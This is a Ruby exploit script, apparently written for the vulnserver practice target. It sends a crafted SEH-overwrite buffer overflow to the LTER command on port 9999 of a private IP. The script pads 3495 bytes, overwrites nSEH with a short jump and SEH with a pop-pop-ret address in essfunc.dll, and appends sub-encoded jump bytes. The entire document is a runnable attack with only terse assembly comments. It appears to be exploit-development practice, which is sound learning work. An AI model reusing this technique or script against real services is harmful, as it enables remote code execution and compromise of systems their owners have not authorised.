#!/usr/bin/ruby

require 'socket'

target = '192.168.1.121'
port = 9999

s = TCPSocket.open(target, port)

# nseh offset at 3495
payload = "A" * 3495

# we move esp to eax, we jmp forward
#nasm > push esp
#00000000  54                push esp
#nasm > pop eax
#00000000  58                pop eax
#nasm > jno short 4
#00000000  7104              jno 0x4
payload += "\x54\x58\x71\x04"
# pop pop ret in essfunc.dll at 0x6250172b
payload += "\x2b\x17\x50\x62"

# sub encode from jmp-126.bin
payload += "\x66\x05\x11\x11\x2c\x62\x50\x5c\x66\x2d\x14\x7f\x50"
payload += "A" * (5000 - payload.length)

s.puts('LTER /.:/' + payload)
s.close()
